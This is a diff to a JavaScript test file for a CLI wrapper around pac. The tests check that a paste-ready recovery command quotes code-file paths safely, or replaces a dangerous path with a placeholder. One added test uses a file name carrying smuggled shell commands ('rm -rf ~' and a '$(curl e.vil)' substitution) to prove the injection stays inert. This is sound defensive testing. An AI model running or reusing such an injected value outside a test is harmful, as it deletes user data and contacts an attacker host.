@@ -1672,14 +1672,31 @@ test('an UPDATE that timed out after pac printed the Page ID says the page was w
   await assert.rejects(makeGenpageCli('https://x', { run: cut, sleep: async () => {} }).upload({ appId: 'a', pageId: GUID, codeFile: 'o.tsx', name: 'Overview' }), /pac writes the page, then records the prompt/);
 });
 
-// The check is a command the user pastes, so a code file under a folder with a space in its name (a Windows profile folder is often one) has to stay one argument in it.
-test('the check an UPDATE that timed out points to is a whole command, and keeps a code file path with a space as one argument', async () => {
+// The check is a command the user — or the agent — pastes, so a code file under a folder with a space in its name (a Windows profile folder is often one) has to stay one
+// argument in it, and a path with shell syntax in it (an untrusted checkout) must not run any of it: such a path is single-quoted, and one no shell can be given unchanged
+// (a quote or a line break in it, say) is not written into the command at all — a placeholder is, and the path is named as data.
+test('the check an UPDATE that timed out points to is a whole command, and keeps a code file path one literal argument — or names it outside the command', async () => {
   const cli = makeGenpageCli('https://contoso.crm.dynamics.com', { run: async () => timedOutRun(600000, 'pac model genpage upload'), sleep: async () => {} });
   await assert.rejects(cli.upload({ appId: 'app-1', pageId: GUID, codeFile: 'C:\\Users\\Dev User\\pages\\overview.tsx', name: 'Overview' }), (e) => {
-    assert.match(e.message, /First see what is deployed: node scripts\/genpage-base\.js check --env https:\/\/contoso\.crm\.dynamics\.com --app-id app-1 --page-id 6e0c28a2-cdbf-41ec-9186-d10fd5de6e35 --file "C:\\Users\\Dev User\\pages\\overview\.tsx" \("contentSame"/);
+    assert.match(e.message, /First see what is deployed: node scripts\/genpage-base\.js check --env https:\/\/contoso\.crm\.dynamics\.com --app-id app-1 --page-id 6e0c28a2-cdbf-41ec-9186-d10fd5de6e35 --file 'C:\\Users\\Dev User\\pages\\overview\.tsx' \("contentSame"/);
     return true;
   });
-  await assert.rejects(cli.upload({ appId: 'app-1', pageId: GUID, codeFile: 'out/overview.tsx', name: 'Overview' }), /--file out\/overview\.tsx \("contentSame"/, 'a path without a space is shown as it is');
+  await assert.rejects(cli.upload({ appId: 'app-1', pageId: GUID, codeFile: 'out/overview.tsx', name: 'Overview' }), /--file out\/overview\.tsx \("contentSame"/, 'a plain path is shown as it is');
+  await assert.rejects(cli.upload({ appId: 'app-1', pageId: GUID, codeFile: 'pages/x;rm -rf ~;$(curl e.vil).tsx', name: 'Overview' }), (e) => {
+    assert.ok(e.message.includes("--file 'pages/x;rm -rf ~;$(curl e.vil).tsx' (\"contentSame\""), 'shell syntax in a path stays inside single quotes');
+    return true;
+  });
+  await assert.rejects(cli.upload({ appId: 'app-1', pageId: GUID, codeFile: "pages/it's;echo x.tsx", name: 'Overview' }), (e) => {
+    assert.ok(e.message.includes('--file <file> ("contentSame"'), 'a path with a quote is not written into the command');
+    assert.ok(e.message.includes('<file> is "pages/it\'s;echo x.tsx"; it is not written into the command because no way of writing it reaches the command unchanged in both PowerShell and a POSIX shell. Then re-run the upload'), e.message);
+    assert.ok(!e.message.includes("--file 'pages/it"), 'never as an argument');
+    return true;
+  });
+  await assert.rejects(cli.upload({ appId: 'app-1', pageId: GUID, codeFile: 'pages/x"y.tsx', name: 'Overview' }), (e) => {
+    assert.ok(e.message.includes('--file <file> ("contentSame"'), 'Windows PowerShell would drop the double quote on its way to node');
+    assert.ok(e.message.includes('<file> is "pages/x\\"y.tsx"; it is not written into the command'), e.message);
+    return true;
+  });
 });
 
 // The upload script sends pac a COPY of the bytes it checked (removed once pac answers) and passes the file the caller named as `sourceFile`: the check the message points to is
@@ -1688,7 +1705,7 @@ test('the check an UPDATE that timed out points to names the caller\'s file (sou
   const cli = makeGenpageCli('https://contoso.crm.dynamics.com', { run: async () => timedOutRun(600000, 'pac model genpage upload'), sleep: async () => {} });
   const copy = 'C:\\Users\\Dev User\\AppData\\Local\\Temp\\genpage-code-x1y2z3\\overview.tsx';
   await assert.rejects(cli.upload({ appId: 'app-1', pageId: GUID, codeFile: copy, sourceFile: 'C:\\Users\\Dev User\\pages\\overview.tsx', name: 'Overview' }), (e) => {
-    assert.match(e.message, /--file "C:\\Users\\Dev User\\pages\\overview\.tsx" \("contentSame"/);
+    assert.match(e.message, /--file 'C:\\Users\\Dev User\\pages\\overview\.tsx' \("contentSame"/);
     assert.ok(!e.message.includes('genpage-code-'), 'the copy is not named');
     return true;
   });
